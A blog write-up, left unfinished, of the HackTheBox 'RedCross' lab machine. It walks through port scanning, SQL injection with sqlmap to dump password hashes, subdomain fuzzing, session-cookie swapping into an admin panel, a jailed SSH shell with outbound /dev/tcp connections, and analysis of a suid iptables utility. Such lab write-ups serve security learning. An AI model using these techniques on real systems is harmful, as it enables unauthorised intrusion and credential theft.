+++
title = "HackTheBox - RedCross"
date = 2018-11-16T00:00:00-00:00
draft = false
tags = ["HackTheBox", "RedCross", "snoom", "hacking", "root"]
categories = []
+++
This is a writeup for the new machine released on HackTheBox, named 'RedCross', and the first post on my new blog/website/ramblings!

HackTheBox is something I have recently begun to partake in, a friend has completed quite a chunk of the machines
and piqued my interest in it. I will be writing up the interesting machines as I make my way through them and find the time.

#### **If you dont want spoilers, turn away now!**

I must give my friend credit for this post also - as I did not complete this solo. We worked through this machine together (mostly him, I can't deny his skills), for the sake of anonymity I will call him friend throughout this post.


## Enumeration
---

As always, the first stage is to enumerate the machine. Initially, we fire off an nmap scan of the box in order to externally exposed services that we can interact with.


#### Nmap 
---

```
root@pwnbox:~# nmap -sS -sV -p- -v 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-16 15:26 GMT
NSE: Loaded 43 scripts for scanning.
Initiating Ping Scan at 15:26
Scanning 10.10.10.113 [4 ports]
Completed Ping Scan at 15:26, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:26
Completed Parallel DNS resolution of 1 host. at 15:26, 0.02s elapsed
Initiating SYN Stealth Scan at 15:26
Scanning 10.10.10.113 [65535 ports]
Discovered open port 80/tcp on 10.10.10.113
Discovered open port 443/tcp on 10.10.10.113
Discovered open port 22/tcp on 10.10.10.113
<snip>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.25
443/tcp open  ssl/http Apache httpd 2.4.25
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Not much is available, two webserver ports (both running the same version) and an ssh server: 80, 443 & 22. 


#### Webserver
---

Attempting to visit HTTP port 80 redirects us to `https://intra.redcross.htb/`

```
root@pwnbox:~# curl http://10.10.10.113/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://intra.redcross.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at 10.10.10.113 Port 80</address>
</body></html>
```

The information which stands out through this redirect, is that the 301 doesn't take us to the IP at HTTPS. Following the redirect takes us to https://**intra.redcross.htb**/

In order to access the site, we added a record to our local hosts file.

`10.10.10.113	intra.redcross.htb`

Now we could visit the site through a browser, where we are greeted with a standard login portal. The standard CTF-style attempts of basic usernames and passwords were attempted, admin:admin, admin:password, redcross:redcross etc netted zero gain. Further enumeration was needed!


&nbsp;&nbsp;<center><img src="rcross_intra_main.jpg" width="600"></center>&nbsp;&nbsp;


#### Nikto
----

```
roott@pwnbox:~# nikto -h https://intra.redcross.htb
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.113
+ Target Hostname:    intra.redcross.htb
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=US/ST=NY/L=New York/O=Red Cross International/OU=IT/CN=intra.redcross.htb/emailAddress=penelope@redcross.htb
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=US/ST=NY/L=New York/O=Red Cross International/OU=IT/CN=intra.redcross.htb/emailAddress=penelope@redcross.htb
+ Start Time:         2018-11-16 23:52:30 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: /?page=login
```

Although Nikto did not find anything at all useful, it did point out a username & email address within the HTTPS certificate: **penelope**@redcross.htb.


#### Gobuster
---

In order to see what else is public on the server, _Gobuster_ was used with the standard dirb _common.txt_ wordlist.

```
root@pwnbox:~# gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirb/common.txt -k

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://intra.redcross.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/16 18:17:28 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/documentation (Status: 301)
/images (Status: 301)
/index.php (Status: 302)
/javascript (Status: 301)
/pages (Status: 301)
/server-status (Status: 403)
=====================================================
2018/11/16 18:18:51 Finished
=====================================================
```

`hxxps://intra.redcross.htb/documentation` stood out as something worth looking into, however bruteforce attempts were fruitless. In order to attempt a different approach, X suggested that a typical documentation extension was added to the files. Another wordlist with the _pdf_ extension gave us the path: hxxps://intra.redcross.htb/documentation/**account-signup.pdf**


&nbsp;&nbsp;<center><img src="signup_pdf.jpg" width="600"></center>&nbsp;&nbsp;

## Foothold
---

Fire off our request and we're given back the credentials **guest:guest** ... D'oh!

Logging in provides us with some intriguing cookies:
```
Set-Cookie: LANG=EN_US; expires=Thu, 14-Feb-2019 19:01:02 GMT; Max-Age=7776000; path=/
Set-Cookie: SINCE=1542394862; expires=Thu, 14-Feb-2019 19:01:02 GMT; Max-Age=7776000; path=/
Set-Cookie: LIMIT=10; expires=Thu, 14-Feb-2019 19:01:02 GMT; Max-Age=7776000; path=/
Set-Cookie: DOMAIN=intra; expires=Thu, 14-Feb-2019 19:01:02 GMT; Max-Age=7776000; path=/
```

DOMAIN=intra... Hmm. 

The site was rather basic once access was gained. Some form of database holding messages sent to the particular logged in user.


&nbsp;&nbsp;<center><img src="main_page.jpg" width="600"></center>&nbsp;&nbsp; 


Quick enumeration of the page revealed an injection point within the uid field. SQLMap time! (mostly snipped out). A delay was added as through the initial enumeration phase, the server appeared to blacklist IPs when it was being hammered a bit too hard.

```
root@pwnbox:~# sqlmap -p o -r rc_mainpage --delay=0.5 --dbs
<snip>
[20:38:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0
[20:38:20] [INFO] fetching database names
[20:38:23] [INFO] used SQL query returns 2 entries
[20:38:33] [INFO] retrieved: information_schema
[20:38:50] [INFO] retrieved: redcross


root@pwnbox:~# sqlmap -p o -r rc_mainpage --delay=0.5 --tables -D redcross
<snip>
[20:41:10] [INFO] fetching tables for database: 'redcross'
[20:41:11] [INFO] used SQL query returns 3 entries
[20:41:12] [INFO] retrieved: messages
[20:41:12] [INFO] retrieved: requests
[20:41:13] [INFO] retrieved: users


root@pwnbox:~# sqlmap -p o -r rc_mainpage --delay=0.5 -D redcross -T users --dump
<snip>
Database: redcross
Table: users
[5 entries]
+----+------+------------------------------+----------+--------------------------------------------------------------+
| id | role | mail                         | username | password                                                     |
+----+------+------------------------------+----------+--------------------------------------------------------------+
| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. |
| 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS |
| 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i |
| 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. |
| 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |
+----+------+------------------------------+----------+--------------------------------------------------------------+

```

The user Charles was cracked, with the password being _cookiemonster_ - the SSH server denied logging in with this user account however. 

Time to look further into the domains on this server, there must be more than one. My friend, X, taught me the ways of wfuzz to bruteforce other subdomains that the site could respond to. After much trial an error, the right amout of error codes were omitted and a successful bruteforce was underway:

```
root@pwnbox:~# wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404,400,301 -u https://redcross.htb -H "Host: FUZZ.redcross.htb" 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3 - The Web Fuzzer                           *
********************************************************

Target: https://redcross.htb/
Total requests: 4613

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000285:  C=421     12 L	      49 W	    407 Ch	  "admin"
000286:  C=421     12 L	      49 W	    407 Ch	  "Admin"
000287:  C=421     12 L	      49 W	    407 Ch	  "ADMIN"
002091:  C=302      0 L	      26 W	    463 Ch	  "intra"

Total time: 66.42285
Processed Requests: 4613
Filtered Requests: 4609
Requests/sec.: 69.44898
```

Requesting this page gave us another login portal, the login charles gave us an "Not enough privileges!" message... What if we could swap out the _guest_ session cookie from the main page?  


&nbsp;&nbsp;<center><img src="admin_panel.jpg" width="600"></center>&nbsp;&nbsp;


Winner winner, chicken dinner! From here there are two sections to the admin panel, User Management and Network Access.  Let's take a look at User Management first.

Another basic page is displayed with limited input fields, an option to add a "Virtual user". Doing this provides us with credentials:

```
Provide this credentials to the user:

Test : HEUJnn4k

Continue
``` 

Coming back to the User Management page now shows us our added account, _Test_, a UID and a GID and an action to delete the user. There appear to be no vulnerabilities that can leverage us access to the system.

## Don't Drop the Soap 
---

As we now have credentials, as well as user ID and group ID, my friend X and I go to jail.

```
root@pwnbox:~# ssh Test@10.10.10.113
Test@10.10.10.113's password: 
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ whoami && id
whoami: cannot find name for user ID 2662
$ pwd
/
$ ls
bin  dev  etc  home  lib  lib64  root  usr
$ env | grep -i path
-bash: grep: command not found
-bash: env: command not found
$ ls bin
bash  cat  id  ls  mkdir  vim  vim.tiny  whoami
$ /bin/bash
bash-4.4$ set
BASH=/bin/bash
BASHOPTS=cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=()
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="4" [1]="4" [2]="12" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='4.4.12(1)-release'
COLUMNS=80
DIRSTACK=()
EUID=2662
GROUPS=()
HISTFILE=/var/jail/home/.bash_history
HISTFILESIZE=500
HISTSIZE=500
HOME=/var/jail/home
HOSTNAME=redcross
HOSTTYPE=x86_64
IFS=$' \t\n'
LANG=en_US.UTF-8
LINES=24
LOGNAME=Test
MACHTYPE=x86_64-pc-linux-gnu
MAIL=/var/mail/Test
MAILCHECK=60
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
PIPESTATUS=([0]="127")
PPID=10959
PS1='\s-\v\$ '
PS2='> '
PS4='+ '
PWD=/
SHELL=/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=2
SSH_CLIENT='10.10.13.xx 55822 22'
SSH_CONNECTION='10.10.13.xx 55822 10.10.10.113 22'
SSH_TTY=/dev/pts/7
TERM=xterm-256color
UID=2662
USER=Test
_=env
bash-4.4$ 
```

We gained some more information about the machine:

`Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64`

My friend worked on this jail for a good few hours, we found that we could utilise bash `/dev/tcp/x.x.x.x/yy` in order to establish a connection out and subsequently moves files into and out of the jail. He added BusyBox, chmod and a few other essential administrative files. There was also another critical piece of information held within this jail, source code for a utility named `iptctl` -- (Find it here: <a href="iptctl.c">iptctl.c</a>) 

My friend had built up quite an environment within this jail, however many of the attempts to break out of it were met with dead ends and stares of frustration at the terminal in front of us. Exploits failed, it seemed very well locked down.

#### IptCtl Analysis
---

Upon viewing the file, the header gives a brief but succinct description of the tool. 

``` c
/*
 * Small utility to manage iptables, easily executable from admin.redcross.htb
 * v0.1 - allow and restrict mode
 * v0.3 - added check method and interactive mode (still testing!)
 */
```

Considering the other section of the admin control panel is "Network Access", it's clear we have access to execute this binary from there, it also must have suid set in order to manage iptables. Let's continue the analysis before we delve into the network access panel.

The file takes a second argument of the following 3 options: allow, restrict, show and a final argument of the IP address in question.

The IP address is validated using the function `isValidIpAddress()`:
``` c
int isValidIpAddress(char *ipAddress)
{
	struct sockaddr_in sa;
	int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
	return result != 0;
}
```

The function `inet_pton()` takes a string form network address and converts it to the binary form for use with a socket, an error occurs `if the string does not contain a character string representing a valid network address` (man inet_pton).

The server application definitely has some form of server-side checks on the IP address supplied, and this is on the application, not the web application which will execute the binary.

#### Execution of IPTables
---

``` c
puts("DEBUG: All checks passed... Executing iptables");
if(isAction==1) cmdAR(args,"-A",inputAddress);
if(isAction==2) cmdAR(args,"-D",inputAddress);
if(isAction==3) cmdShow(args);
	
child_pid=fork();
if(child_pid==0){
	setuid(0);
	execvp(args[0],args);
	exit(0);
}
else{
	if(isAction==1) printf("Network access granted to %s\n",inputAddress);
	if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
	if(isAction==3) puts("ERR: Function not available!\n");
}
```

If the IP address supplied is valid, as well as the "action" (argument) being valid, a message is printed that the checks have passed and that IPTables will be executed.   

The function `cmdAR()` is then used to build the arguments array, in order to pass through to `execvp()`. This essentially swaps in the IP address and subsequent delete or add rule flag (-D | -A) to the arguments list.  

The binary forks itself, elevates its privileges to root and executes the command. and displays a message to stdout before exiting. 

## Write up not complete yet for visitors who have found my site. Soon :)
